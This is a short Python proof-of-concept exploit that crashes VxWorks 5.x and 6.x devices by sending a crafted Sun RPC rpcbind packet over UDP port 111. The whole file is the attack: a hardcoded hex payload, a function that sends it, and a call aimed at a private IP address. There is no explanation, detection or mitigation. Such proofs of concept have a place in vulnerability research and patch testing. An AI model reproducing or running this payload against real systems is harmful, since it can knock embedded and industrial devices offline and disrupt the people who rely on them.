#!/usr/bin/env python
# encoding: utf-8

import socket
import sys
# VxWorks version 5.x & 6.x
# DOS on udp port 111, Sun RPC rpcbind
# By xiaohu@404


PAYLOAD_HEX = 'cc6ff7e200000000000000020001a086000000040000000488888888000000110000001100001111111111111111111111111111'
# PAYLOAD_HEX = 'cc6ff7e20000000000000020001a086000000040000000488888888000000110000001100001111111111111111111111111111'

def poc(host, rpc_port=111):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(bytearray.fromhex(PAYLOAD_HEX), (host, rpc_port))


if __name__ == '__main__':
    poc('192.168.1.191')
